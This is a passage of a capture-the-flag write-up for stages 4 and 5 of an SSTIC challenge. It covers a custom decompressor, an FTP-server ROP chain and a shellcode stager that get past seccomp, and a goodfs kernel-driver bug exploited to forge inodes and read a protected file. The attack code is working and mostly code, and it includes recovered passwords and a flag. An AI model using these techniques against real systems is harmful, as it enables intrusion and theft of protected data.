7d66:   push ebp
        sub esp, 0x40
        mov ebp, esp
        mov eax, [esp+0x50]
        mov [ebp], eax
        mov eax, [esp+0x54]
        jmp 51cf
51cf:   mov [ebp+4], eax
        mov eax, [esp+0x58]
        mov [ebp+8], eax
        mov eax, [esp+0x5c]
        mov [ebp+12], eax
        mov eax, [esp+0x60]
        mov [ebp+16], eax
        jmp 4b26
4b26:   mov edi, [esp+0x48]
        mov edx, esp
        mov [ebp+0x38], edx
        sub esp, 0x100
        mov [ebp+0x28], esp
        mov edx, [edi]
        lea esi, [entry]
        add esi, edx
        jmp esi
```

This should look familiar - it's another VM, but this time using 32-bit code as instruction handlers. So, a quick modification to `zzdisas.py` produces the 32-bit version, [`zzdisas32.py`](files/stage4/zzdisas32.py). This time, since we already understand most of the file format, we just need to disassemble enough of the 32-bit VM ([`zzdisas32.txt`](files/stage4/zzdisas32.txt)) to understand how it's encoding the match literals (which are what are being passed to this function). Unsurprisingly, it's yet another Huffman tree, and we just need to know what the configuration is (number of codewords, mapping of codewords to literal counts).

### The Decompressor

Finally, after reversing everything, we know the structure of the compressed file. It mainly consists of four encoded Huffman trees, with some 24-bit length/count fields interspersed. Each Huffman tree encodes a fixed number of possible symbols: 256 literal symbols, and 32 symbols each for the match offsets, match lengths, and match literal run lengths. Each tree starts with a description of the tree - the value and length for each symbol - followed by a packed bitstream of Huffman codes. Match offset, length, and literal length codes may each be followed by an additional sequence of bits to refine the value.

By reading each Huffman-encoded sequence, we can reconstruct all of the matches and literals, and then use that information to reconstruct the original input file. I wrote a script, [`unzz.py`](files/stage4/unzz.py), which performs the decompression:

```python
from collections import defaultdict
import sys

class BitReader:
    def __init__(self, data):
        self.pos = 0
        self.data = data

    def __len__(self):
        return len(self.data) * 8

    def read(self, n):
        val = 0
        while n > 0:
            bits = (self.data[self.pos >> 3] << (self.pos % 8)) & 0xff
            take = min(n, 8 - (self.pos % 8))
            val = (val << take) | (bits >> (8 - take))
            n -= take
            self.pos += take
        return val

    def read24(self):
        assert self.pos % 8 == 0
        a, b, c = self.data[self.pos >> 3:(self.pos >> 3) + 3]
        self.pos += 24
        return (a + (b << 8) + (c << 16))

    def pad(self):
        rem = self.pos % 8
        if rem:
            self.pos += 8 - rem


class HuffmanTables:
    def __init__(self, reader, max_bins):
        nbits = max_bins.bit_length() - 1
        nbins = reader.read(nbits) + 1
        bins = [(reader.read(nbits), reader.read(4) + 1) for _ in range(nbins)]
        reader.pad()

        self.bins = bins
        self.codes_by_length = defaultdict(dict)
        self.min_length = 999
        prevdepth = -1
        code = 0
        for val, depth in bins:
            if prevdepth == depth:
                code += 1
            elif prevdepth != -1:
                code = (code + 1) << (depth - prevdepth)
            prevdepth = depth
            self.min_length = min(depth, self.min_length)
            self.codes_by_length[depth][code] = val

    def read(self, reader):
        length = self.min_length
        code = reader.read(self.min_length)
        while code not in self.codes_by_length[length]:
            length += 1
            code = (code << 1) + reader.read(1)
        return self.codes_by_length[length][code]


def read_match_lit(huff, reader):
    n = huff.read(reader)
    if n < 0x10: return n
    nbits = n - 0xc
    return reader.read(nbits) | (1 << nbits)

def read_match_off(huff, reader):
    n = huff.read(reader)
    if n < 2: return n
    nbits = n - 1
    return reader.read(nbits) | (1 << nbits)

def read_match_len(huff, reader):
    n = huff.read(reader)
    if n < 0x10: return n
    nbits = n - 0xc
    return reader.read(nbits) | (1 << nbits)

r = BitReader(open(sys.argv[1], "rb").read())
outf = open(sys.argv[1].replace(".zz", ""), "wb")

while r.pos < len(r):
    outblock = bytearray()

    print("block at %d" % (r.pos // 8))
    blocksize = r.read24()
    blockstart = r.pos

    num_literals = r.read24()
    compressed_literals_len = r.read24()
    startpos = r.pos
    lit_huff = HuffmanTables(r, 0x100)
    lits = bytes([lit_huff.read(r) for _ in range(num_literals)])
    r.pad()
    assert r.pos == startpos + compressed_literals_len * 8

    num_matches = r.read24()

    match_lit_huff = HuffmanTables(r, 0x20)
    match_lits = [read_match_lit(match_lit_huff, r) for _ in range(num_matches)]
    r.pad()

    match_off_huff = HuffmanTables(r, 0x20)
    match_offs = [read_match_off(match_off_huff, r) for _ in range(num_matches)]
    r.pad()

    match_len_huff = HuffmanTables(r, 0x20)
    match_lens = [read_match_len(match_len_huff, r) for _ in range(num_matches)]
    r.pad()

    assert r.pos == blockstart + blocksize * 8
    assert sum(match_lits) == num_literals

    litpos = 0
    for i in range(num_matches):
        match_lit = match_lits[i]
        match_off = match_offs[i]
        match_len = match_lens[i]
        outblock += lits[litpos:litpos+match_lit]
        litpos += match_lit
        if match_len:
            m = outblock[-match_off:]
            m = m * ((match_len + len(m) - 1) // len(m))
            outblock += m[:match_len]
    outf.write(outblock)
```

When run on [`home_backup.tar.zz`](files/stage4/home_backup.tar.zz), this spits out a valid TAR archive [`home_backup.tar`](files/stage4/home_backup.tar). I extracted the contents of this archive to [`home_backup`](chall/home_backup). Inside, the [`notes.txt`](chall/home_backup/notes.txt) file reads (translated):

```
I read FIORANELLI's paper and indeed we did well to have it retracted, a little
more and it would have been taken seriously and would have attracted the
attention of the general public...

Such information could have reduced the Organization to nothing...

SSTIC{0ded220ffb9d4215b090ebb509e7a1ef}
```

There's our flag for stage 4!

## Stage 5

Inside `home_backup`, we also find a [`.bash_history`](chall/home_backup/.bash_history) file, which contains the following:

```
ls -la
whoami
id
cd /tmp
ls
mounter_client mount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
cd /mnt/goodfs
ls
cd
cd
cd
exit
```

From this, we obtain the password for mounting the goodfs, so now our goal is to explore this filesystem.

`mounter_client` and `mounter_server` are both very simple, unobfuscated programs. `mounter_server` is launched by the `init` script. It must be run as root. It retrieves the password from the HSM via function 0x04, which also clears the password from the EEPROM. `mounter_server` double checks that the password is indeed cleared as a sanity check on the HSM.

`mounter_server` connects `/dev/sdb` to a loop block device (`/dev/loop5`), then creates a world-writable file called `/run/mount_shm`. It `mmap`s this file and treats that memory region as containing the following structure:

```c
struct mounter_shm {
    int flag;
    char password[256];
    char command[256];
    char arguments[256];
};
```

It then waits for `flag` to be set to 1. When it is, `mounter_server` uses `malloc` to allocate a new buffer and `memcpy`'s the contents of `mount_shm` into the buffer. It checks to see if the password is correct; if so, it calls a `do_command` function with the command and arguments.

`do_command` accepts only two command/argument pairs: `mount goodfs` uses the `mount` syscall to mount `/dev/loop5` to `/mnt/goodfs` using the `goodfs` filesystem. `umount goodfs` uses `umount` to unmount `/mnt/goodfs`. At the end, the result is logged using `syslog`. Once the command is complete, the `flag` will be set based on the result to either 2 (password valid) or 3 (password invalid).

`mounter_client` is even simpler: it mmaps `/run/mount_shm`, then copies the three command-line arguments (command, arguments, and password) into the `mount_shm` structure and sets `flag` to 1. It then waits for `flag` to be not equal to 1, indicating command completion. Thus, using the `mount_shm` IPC mechanism, any unprivileged user account can mount and unmount the goodfs filesystem.

However, we cannot use `mounter_client` directly from the FTP server process because `execve` is blocked. Thus, we will have to emulate the IPC mechanism ourselves inside the process. For this, we will want to run real code in that process instead of using ropchains.

### Running Code in the FTP Server

The FTP server's seccomp filter blocks execve. So, uploading a separate program and executing it will be out of the question. Instead, I decided to use the Shellcode Compiler from Binary Ninja to compile C code into portable machine code that can be directly injected into the process. The Shellcode Compiler produces compact, self-contained programs with support for functions like `fprintf` in just a few KB of code.

The seccomp filter also prevents calling `mmap` with a `prot` argument greater than 5. Thus, we cannot use `PROT_WRITE | PROT_EXEC` or `PROT_READ | PROT_WRITE | PROT_EXEC`. To work around the `mmap` limitation, I wrote the machine code into a temporary file, then `mmap`ed that file as `PROT_READ | PROT_EXEC`. The basic idea is to use a ropchain to call `open("temp", O_RDWR, 0666)`, then `read(5, buffer, 4096)`, `write(tempfd, buffer, 4096)`, and finally `mmap(NULL, 4096, PROT_READ | PROT_EXEC, MAP_SHARED, tempfd, 0)`. Here's how that looks in the FTP server exploit (full exploit in [`run_shellcode.py`](files/stage5/run_shellcode.py)):

```python
pop_rdi = libcbase + 0x0007a307
pop_rsi = libcbase + 0x0007a0ff
pop_rdx_rcx_rbx = libcbase + 0x001025ad
pop_rdx_r12 = libcbase + 0x00134c09
mov_rdx_rax = libcbase + 0x000425cf
pop_rsp = libcbase + 0x00054d0d
ropspace = heapbase + 0x10000
dataspace = heapbase + 0x11000
mov_rax_rdx = libcbase + 0x000b6b18
inc_rax = libcbase + 0x000cfb20
mov_r8d_eax = libcbase + 0x0011f807
mov_r9_rax_pop_r12_r13_r14 = libcbase + 0x0007a1a0

shellcode = open("stager", "rb").read()

# fds: 0=stdin, 1=stdout, 2=stderr, 3=serial_port, 4=server_sock, 5=client_sock, 6=dbg
rop = [
    # open(filename, O_RDWR | O_CREAT, 0o666)
    pop_rdi, exebase + 0x6354, # "listen"
    pop_rsi, 0x42,
    pop_rdx_rcx_rbx, 0o666, 0, 0,
    exebase + 0x22d0,
    # read(5, dataspace, len(shellcode))
    pop_rdi, 5,
    pop_rsi, dataspace,
    pop_rdx_rcx_rbx, len(shellcode), 0, 0,
    exebase + 0x21c0,
    # write(7, dataspace, len(shellcode))
    pop_rdi, 7,
    pop_rsi, dataspace,
    pop_rdx_rcx_rbx, len(shellcode), 0, 0,
    exebase + 0x20c0,
    # mmap(NULL, len(shellcode), PROT_READ | PROT_EXEC, MAP_SHARED, 7, 0)
    pop_rdx_r12, 7, 0, mov_rax_rdx, mov_r8d_eax,
    pop_rdx_r12, 0, 0, mov_rax_rdx, mov_r9_rax_pop_r12_r13_r14, 0, 0, 0,
    pop_rdx_rcx_rbx, 5, 1, 0,
    pop_rdi, 0,
    pop_rsi, (len(shellcode) + 4095) & ~0xfff,
    libcbase + 0x1188f0,
    # jmp rax
    libcbase + 0x0007e051,
]
payload = flat(rop) + b"perms=63&user=x"
sig = sign(payload)
payload = payload.replace(b"\0", b"\n") + b"&sig=%d&" % sig
payload = payload.ljust(0x208, b"X")
assert len(payload) == 0x208
payload = payload + p64(0x41) + struct.pack("<QQQQQQ", 1, 0xff, certaddr, 0, signptr(pop_rdi), 0)
send_cmd("CERT", base64.b64encode(payload), reply=False)

s.send(shellcode)

s.recvuntil(b"ready")
sc = open("shellcode", "rb").read()
s.send(p32(len(sc)))
s.send(sc)

s.interactive()
```

However, there's a bit of a wrinkle: with sockets, `read` can return early, and in testing it would frequently return after just a single TCP packet (so after ~1400 bytes). The seccomp filter blocks `recv*` functions so we can't use `MSG_WAITALL`. As a workaround, I used Shellcode Compiler to build a tiny stager ([`stager.c`](files/stage5/stager.c)):

```c
void readall(int fd, void *buf, int size) {
  while(size > 0) {
    int res = read(fd, buf, size);
    if(res < 0) {
      return;
    }
    buf += res;
    size -= res;
  }
}

int main() {
  char buf[65536];
  int fd = open("lunatic", O_RDWR | O_CREAT, 0666);
  write(5, "ready", 5);
  int size;
  readall(5, &size, 4);
  readall(5, buf, size);
  write(fd, buf, size);
  void *code = mmap(NULL, (size + 4095) & ~0xfff, PROT_READ | PROT_EXEC, MAP_SHARED, fd, 0);
  goto *code;
}
```

This stager compiles to just 312 bytes of x86-64 assembly ([`stager`](files/stage5/stager)). We inject it first using the ropchain, then send the stager the length of the final payload and the payload itself. With it, we can run a payload of arbitrary length. One of the earliest payloads I sent was to enumerate the filesystem ([`shellcode1.c`](files/stage5/shellcode1.c)):

```c
#define SOCKFD 5
#define SOCK fdopen(SOCKFD)
#define printf(...) fprintf(SOCK, ##__VA_ARGS__)

/** syscall wrappers **/
void exit_group(int code) {
    __syscall(231, code);
}

int getdents64(int fd, void *dents, int size) {
    return __syscall(217, fd, dents, size);
}

/** goodfs stuff **/
struct mounter_shmem {
    int flag;
    char password[256];
    char command[256];
    char arguments[256];
};

int mount_cmd(char *command, char *arguments) {
    int mfd = open("/run/mount_shm", 2, 0);
    void *maddr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    struct mounter_shmem *m = (struct mounter_shmem *)maddr;
    strcpy(m->password, "MGhtT34gHj5yFcszRYB4gf45DtymEi");
    strcpy(m->command, command);
    strcpy(m->arguments, arguments);
    m->flag = 1;
    struct timespec sleeptime;
    sleeptime.tv_sec = 0;
    sleeptime.tv_nsec = 1000000;
    while(m->flag == 1)
      nanosleep(&sleeptime, NULL);
    int res = m->flag;
    munmap(maddr, 0x1000);
    close(mfd);
    return res;
}

void do_mount() {
    int res = mount_cmd("mount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

void do_umount() {
    int res = mount_cmd("umount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

/** ls replacement **/
struct linux_dirent64 {
    uint64_t ino;
    uint64_t off;
    short reclen;
    char type;
    char name[1];
};

void showstat(const char *path) {
    int fd = open(path, O_RDONLY, 0);
    if(fd < 0) {
        printf("[open err: %d]\n", fd);
        return;
    }
    struct stat stat;
    int res = fstat(fd, &stat);
    if(res < 0) {
        printf("[stat err: %d]\n", res);
        close(fd);
        return;
    }
    printf("devino=%d:%d mode=0x%x nlink=%d uidgid=%d:%d size=%d\n",
        stat.st_dev, stat.st_ino, stat.st_mode, stat.st_nlink,
        stat.st_uid, stat.st_gid, stat.st_size);
    close(fd);
}

void lsdir(const char *path) {
    char newpath[4096];
    char dents[32768];
    int dfd = open(path, O_DIRECTORY | O_RDONLY, 0);
    while(1) {
        int nbytes = getdents64(dfd, dents, 32768);
        if(nbytes <= 0)
            break;
        int ptr = 0;
        while(ptr < nbytes) {
            struct linux_dirent64 *s = (struct linux_dirent64 *)&dents[ptr];
            printf("ino=%d off=%d type=%d name=%s ", s->ino, s->off, s->type, s->name);
            sprintf(newpath, "%s/%s", path, s->name);
            showstat(newpath);
            ptr += s->reclen;
        }
    }
    close(dfd);
}

int main() {
    do_mount();

    lsdir("/mnt/goodfs");

    do_umount();

    exit_group(0);
}
```

For debugging, I created a "replacement" for the FTP server binary which directly runs shellcode with the same seccomp restrictions and FD numbers as the real server, meaning that I could iterate on my shellcode without going through the whole FTP server exploit every time. I inserted this program into the initramfs and started it from a modified `init` script ([`sc_runner.c`](files/stage5/sc_runner.c)):

```c
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>

void setup() {
  char *hsm_path = getenv("HSM_DEVICE");
  if(!hsm_path) {
    fprintf(stderr,"no hsm\n");
    exit(1);
  }
  int serial_port = open(hsm_path, 2);
  scmp_filter_ctx ctx = seccomp_init(0);
  seccomp_rule_add(ctx,0x7fff0000,3,0);
  seccomp_rule_add(ctx,0x7fff0000,1,0);
  seccomp_rule_add(ctx,0x7fff0000,5,0);
  seccomp_rule_add(ctx,0x7fff0000,0,0);
  seccomp_rule_add(ctx,0x7fff0000,8,0);
  seccomp_rule_add(ctx,0x7fff0000,0x29,0);
  seccomp_rule_add(ctx,0x7fff0000,0x36,0);
  seccomp_rule_add(ctx,0x7fff0000,0x31,0);
  seccomp_rule_add(ctx,0x7fff0000,0x32,0);
  seccomp_rule_add(ctx,0x7fff0000,0x2b,0);
  seccomp_rule_add(ctx,0x7fff0000,0x20,0);
  seccomp_rule_add(ctx,0x7fff0000,0x48,0);
  seccomp_rule_add(ctx,0x7fff0000,0x4f,0);
  seccomp_rule_add(ctx,0x7fff0000,0x33,0);
  seccomp_rule_add(ctx,0x7fff0000,0x101,0);
  seccomp_rule_add(ctx,0x7fff0000,2,0);
  seccomp_rule_add(ctx,0x7fff0000,0xd9,0);
  seccomp_rule_add(ctx,0x7fff0000,4,0);
  seccomp_rule_add(ctx,0x7fff0000,0x50,0);
  seccomp_rule_add(ctx,0x7fff0000,0xc,0);
  seccomp_rule_add(ctx,0x7fff0000,0x10,0);
  seccomp_rule_add(ctx,0x7fff0000,0x23,0);
  seccomp_rule_add(ctx,0x7fff0000,0xc9,0);
  seccomp_rule_add(ctx,0x7fff0000,9,1,SCMP_A2_64(SCMP_CMP_LE, 5));
  seccomp_rule_add(ctx,0x7fff0000,0xb,0);
  seccomp_rule_add(ctx,0x7fff0000,0x5a,0);
  seccomp_rule_add(ctx,0x7fff0000,0x53,0);
  seccomp_rule_add(ctx,0x7fff0000,0x84,0);
  seccomp_rule_add(ctx,0x7fff0000,0xe7,0);
  int res = seccomp_load(ctx);
  if (res != 0) {
    fprintf(stderr,"Failed to load the filter in the kernel\n");
    exit(1);
  }
}

char sc[65536];

int main() {
  printf("Initializing...\n");
  setup();
  int ssock = socket(2, 1, 0);
  int val = 1;
  setsockopt(ssock, 1, 15, &val, 4);
  struct sockaddr_in saddr = {0};
  saddr.sin_port = htons(31500);
  bind(ssock, (struct sockaddr *)&saddr, sizeof(struct sockaddr_in));
  listen(ssock, 1);

  printf("Ready! Listening on port %d...\n", ntohs(saddr.sin_port));
  struct sockaddr_in caddr = {0};
  int caddrsize = sizeof(struct sockaddr_in);
  int csock = accept(ssock, (struct sockaddr *)&caddr, &caddrsize);
  printf("Got connection!\n");

  open("ftp.log",0x42,0x1a4);

  int fd = open("listen", 0x42, 0666);
  int r = read(csock, sc, sizeof(sc));
  write(fd, sc, r);
  void *sc_mmap = mmap(NULL, (r + 4095) & ~0xfff, 5, 1, fd, 0);
  printf("Will execute %d bytes of shellcode at %p\n", r, sc_mmap);
  ((void (*)(void))sc_mmap)();
}
```

Interaction with this runner is done via a very simple Python script ([`sc_runner.py`](files/stage5/sc_runner.py)) which loads the stager followed by the real shellcode:

```python
# Run a shellcode via sc_runner on qemu.
from pwn import *

s = remote("localhost", 31337)
sc = open("stager", "rb").read()

s.send(sc)
s.recvuntil(b"ready")

sc = open("shellcode", "rb").read()
s.send(p32(len(sc)))
s.send(sc)
s.interactive()
```

### The GoodFS Filesystem

With a root shell in `/init`, we can poke around the filesystem we're provided:

```
/mnt/goodfs # ls -laR
.:
total 0
drwx------    1 root     root             0 Jan  1  1970 private
drwxrwxrwx    1 root     root             0 Jan  1  1970 public

./private:
total 0
-rwxr--r--    1 root     root             0 Jan  1  1970 placeholder

./public:
total 0
-rwxr--r--    1 sstic    sstic            0 Jan  1  1970 todo.txt
```

[`/mnt/goodfs/private/placeholder`](files/stage5/goodfs/placeholder) contains the following (translated):

```
Put your sensitive data in this folder
```

[`/mnt/goodfs/public/todo.txt`](files/stage5/goodfs/todo.txt) contains the following (translated):

```
I was informed that a mark_buffer_dirty is missing somewhere in my code, but where?
```

By running some shellcode to mount goodfs and read files on the remote server, we can confirm that the remote `todo.txt` matches this one, and that the `/mnt/goodfs/private` directory is inaccessible to the FTP server user (`sstic`).

[`mark_buffer_dirty`](https://www.kernel.org/doc/htmldocs/filesystems/API-mark-buffer-dirty.html) is a Linux kernel function, so it's clear we're going to have to look at the kernel driver [`goodfs.ko`](chall/initramfs/goodfs.ko) which implements this filesystem.

`goodfs.ko` is a typical Linux kernel module, but it has symbols and even DWARF debugging information! Unfortunately, Ghidra gets confused by some of the more complex kernel data structures in DWARF, which necessitated using IDA instead for reversing the module.

Much of the filesystem driver is concerned with converting between the on-disk representation of filesystem structures (inodes and directory entries), and the Linux Virtual File System (VFS) data structures (`struct inode` and `struct dentry`). Inodes correspond to physical files or directories, where as dentries correspond to the directory entries contained in any particular directory. (A hard link, for example, is just a single inode that shows up as an dentry in more than one directory). The kernel [VFS documentation](https://www.kernel.org/doc/html/latest/filesystems/vfs.html) was very helpful in learning about the various pieces of the filesystem driver.
 
`goodfs.ko` starts with `goodfs_init`, which registers the goodfs filesystem using [`register_filesystem`](https://www.kernel.org/doc/htmldocs/filesystems/API-register-filesystem.html). This provides the user-visible name of the filesystem (`goodfs`) as well as the function used to mount the filesystem (`goodfs_mount`). When the filesystem is mounted, `goodfs_mount` calls [`mount_bdev`](https://elixir.bootlin.com/linux/v5.16.14/source/fs/super.c#L1316) to mount the filesystem as a block device, which in turn calls `goodfs_fill_super` to initialize the VFS superblock. `goodfs_fill_super` allocates memory for the filesystem-specific `goodfs_sb_info` structure, configures the block-device filesystem with a block size of 4096 bytes, and loads the *superblock* (block 0).

The superblock (`goodfs_super_block`) contains three major components: the magic number (0x600d600d at offset 0), a bitmap of in-use inodes (`imap`), and the first half of the inode table (the rest of the inode table is in block #1). The root inode, inode #0, is used as the root of the filesystem. The function `goodfs_iget` is used to retrieve the disk block containing the given inode, and translate the on-disk inode format (`goodfs_inode`) into a kernel `struct inode` structure.

From there, operations on the root directory (or any directory) are handled by the `goodfs_dir_operations` and `goodfs_dir_inode_operations` tables - for example, listing a directory is handled by `goodfs_readdir`, finding a file in a directory by name is `goodfs_lookup`, and creating new files under a directory is handled by `goodfs_create`. Similarly, operations on files are handled by `goodfs_file_operations` and `goodfs_file_inode_operations`, such as `read` (`goodfs_read`) and `write` (`goodfs_write`).

The on-disk formats look like this (from the DWARF symbols):

```c
struct goodfs_imap {
  unsigned __int64 v[8];
};

struct goodfs_super_block {
  __u32 magic;
  __u32 version;
  goodfs_imap imap;
};

struct goodfs_dir_entry {
  __u32 ino;
  char name[32];
};

struct goodfs_inode {
  kuid_t uid;
  kgid_t gid;
  __u64 atime;
  __u64 mtime;
  __u16 data_block;
  __u16 mode;
  __u32 size;
};
```

The filesystem supports a maximum of 252 inodes (32 bytes each); the first 124 inodes are in disk block 0 starting at offset 0x80, and the next 128 are in disk block 1. Directories support a maximum of 32 directory entries (36 bytes each). Files occupy exactly one disk block (4096 bytes), numbered according to the inode number (inode *N* occupies disk block *N* + 2). Directories also occupy exactly one disk block, but the disk block number is given by the `data_block` field of the inode. (`data_block` is ignored for files).

Like any block device filesystem driver, `goodfs` loads disk blocks using the *page cache*, which buffers the disk blocks in RAM. When the `goodfs` requests a disk block using [`sb_bread`](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/buffer_head.h#L301) or a related function, the block will be served from the page cache if available, and otherwise loaded from disk and cached. When the filesystem modifies a disk block by editing the cached copy in memory, the filesystem must mark the disk block as being dirty using [`mark_buffer_dirty`](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/buffer_head.h#L155). Periodically, or during unmount, or when the pages are needed for other allocations, clean disk blocks will be discarded while dirty disk blocks will be written back to the disk.

`goodfs`, however, is missing some calls to `mark_buffer_dirty`, as the hint suggests. Indeed, `goodfs_create`, which is responsible for making new inodes when files or directories are created, is missing a few:

1. It first finds a zero bit in the superblock's in-use bitmap (`imap`) to find a free inode. It then sets the bit to 1, but *fails to call `mark_buffer_dirty` on the superblock*.
2. It then creates a new VFS inode structure, and zeros out the corresponding disk block (block number `inode + 2`). However, it *fails to call `mark_buffer_dirty` on this disk block*.
3. Next, it writes the inode to the inode block (either block 0 or block 1), and writes the inode and name to a new `goodfs_dir_entry` in the parent directory.
4. It recursively updates `mtime` on ancestor directories until it hits the root, using `mark_inode_dirty` on each one. This causes `goodfs_write_inode` to be called on each inode eventually, which correctly uses `mark_buffer_dirty` to mark the containing disk block as dirty.
5. Finally, it marks the parent directory block with `mark_buffer_dirty` and the new inode with `mark_inode_dirty`.

The second bug is enough to break the filesystem: we can, for example, create a file with contents simulating a directory, remove the file, and then create a new directory; the new directory will reuse the contents of the file (because the zeroing of the block will not be committed to disk), causing it to contain whatever inodes we choose. This shell script demonstrates that bug:

```bash
/bin/mounter_client mount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
echo -ne '\x00\x00\x00\x00i0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x01\x00\x00\x00i1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x02\x00\x00\x00i2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x03\x00\x00\x00i3\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x04\x00\x00\x00i4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x05\x00\x00\x00i5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x06\x00\x00\x00i6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
\x07\x00\x00\x00i7\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0' > /mnt/goodfs/public/aaa
rm /mnt/goodfs/public/aaa
/bin/mounter_client umount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
/bin/mounter_client mount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
mkdir /mnt/goodfs/public/bbb # reuses the inode of aaa
ls -la /mnt/goodfs/public/bbb # shows nothing - the disk block is zeroed in memory
/bin/mounter_client umount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
/bin/mounter_client mount goodfs MGhtT34gHj5yFcszRYB4gf45DtymEi
ls -la /mnt/goodfs/public/bbb # shows i1 through i7 - the contents of aaa are reused
```

When run from a shell on the system, the directory `/mnt/goodfs/public/bbb` will contain seven files, `i1` through `i7`, which contain the contents of inodes 1 through 7 (notably, inode 3 will contain the contents of the file in `/private`).

However, we cannot use this approach directly in our FTP server exploit, because `unlink` (and `rmdir`) are blocked by the seccomp filter.

### Corrupting GoodFS

To corrupt the filesystem from the FTP server, we need to make use of the first bug too. This bug causes the bitmap update in `goodfs_create` to not be committed to disk, which would allow a new inode to reuse the same inode number as a recently-created inode. However, the bitmap lives in disk block 0, and `goodfs_create` modifies this disk block with a proper `mark_buffer_dirty` in two cases:

1. If the inode number is less than 124, the new inode will live in disk block 0, and `mark_inode_dirty` will be called on it (which eventually calls `mark_buffer_dirty`).
2. If the modification time of the new inode is newer than an ancestor directory, the `mtime` of the ancestor will be updated and `mark_buffer_dirty` will be called on it.

We can work around the first problem by first creating a sufficient number of dummy files. For the second problem, we can use the [`utime`](https://man7.org/linux/man-pages/man2/utime.2.html) syscall - which is inexplicably permitted by the seccomp configuration - to set the modification time of some ancestor directory into the future before creating the new inode. This causes the recursive `mtime` update to stop at this directory, instead of continuing all the way to the root directory.

The code to do all this looks as follows (full program in [`shellcode2.c`](files/stage5/shellcode2.c)):

```c
void xmkdir(const char *path, int mode) {
    int res = mkdir(path, mode);
    if(res < 0) {
        printf("mkdir %s failed: %d\n", path, res);
        exit_group(1);
    }
}

void my_xutime(const char *path, unsigned long long atime, unsigned long long mtime) {
    unsigned long long timebuf[2];
    timebuf[0] = atime;
    timebuf[1] = mtime;
    int res = __syscall(132, path, timebuf);
    if(res < 0) {
        printf("utime %s failed: %d\n", path, res);
        exit_group(1);
    }
}

struct goodfs_dir_entry {
    int ino;
    char name[32];
};

int main() {
    do_mount();

    /* Allocate enough inodes to spill the new inodes into the second superblock block */
    xmkdir("/mnt/goodfs/public/d0", 0777);
    xmkdir("/mnt/goodfs/public/d1", 0777);
    xmkdir("/mnt/goodfs/public/d2", 0777);
    xmkdir("/mnt/goodfs/public/d3", 0777);
    xmkdir("/mnt/goodfs/public/d4", 0777);
    xmkdir("/mnt/goodfs/public/d5", 0777);
    xmkdir("/mnt/goodfs/public/d6", 0777);
    xmkdir("/mnt/goodfs/public/d7", 0777);
    for(int i=0; i<120; i++) {
        char path[256];
        sprintf(path, "/mnt/goodfs/public/d%d/f%d", i / 16, i % 16);
        int fd = open(path, O_CREAT | O_RDWR, 0666);
        if(fd < 0) {
            printf("failed to create %s: %d\n", path, fd);
        }
        close(fd);
    }
    xmkdir("/mnt/goodfs/public/crimes", 0777);
    /* prevent create from propagating mtime change to root inodes */
    my_xutime("/mnt/goodfs/public/crimes", 0x7fffffff, 0x7fffffff);
    do_umount();

    do_mount();
    /* When creating this inode, the free bitmap update (on the first superblock block)
       will not be committed because of a missing mark_buffer_dirty.
       The inode itself is created on the second superblock block. */
    int fd = open("/mnt/goodfs/public/crimes/aaa", O_CREAT | O_RDWR, 0777);
    struct goodfs_dir_entry entries[16];
    for(int i=0; i<16; i++) {
        entries[i].ino = i;
        sprintf(entries[i].name, "i%d", i);
    }
    write(fd, entries, sizeof(entries));
    close(fd);
    lsdir("/mnt/goodfs/public/crimes");
    do_umount();

    do_mount();
    /* This directory inode will reuse the "aaa" inode. Due to another missing
       mark_buffer_dirty, the zeroing of the data block will not be committed. */
    xmkdir("/mnt/goodfs/public/crimes/bbb", 0777);
    do_umount();

    do_mount();
    /* aaa and bbb now reference the same inode, and bbb's directory contents
       are what was written to the aaa file initially - we can leak any inode */
    lsdir("/mnt/goodfs/public/crimes");
    lsdir("/mnt/goodfs/public/crimes/bbb");
    /* read some spicy secrets? */
    do_mount();
    char buf[4096];
    int secretfd = open("/mnt/goodfs/public/crimes/bbb/i3", O_RDONLY, 0);
    if(secretfd >= 0) {
        read(secretfd, buf, 4096);
        write(SOCKFD, buf, 4096);
        close(secretfd);
    } else {
        printf("failed to open i3: %d\n", secretfd);
    }
    do_umount();

    exit_group(0);
}
```

With this exploit, we can read the file in inode 3; this file is simply [`placeholder`](files/stage5/goodfs/placeholder) locally, but it is a secret file remotely. I later found out it was called [`note.txt`](files/stage5/goodfs/note.txt); here it is, translated:

```
04/30/1945:
    The extraction of our friend on the moon went well, and everyone was convinced that he died.
    In the event of a trip there in the future, it will be necessary to mask its presence by means of special effects.

11/22/1963:
    Our reptilian colleagues at the CIA executed the plan to perfection.

09/25/2022:
    I don't know exactly how, but a hacker managed to forge an inode to read this secret file.
    So I moved my most sensitive information to /root.

    He told me he could also access /root via the compromise of mounter_server, but it's impossible, this service is not vulnerable!
    I'm so confident of this that I removed all mitigations from this program when compiling it.

    He must have corrupted this process via the exploitation of goodfs, but how?
He didn't want to tell me more details, except that he would have used negative inodes...

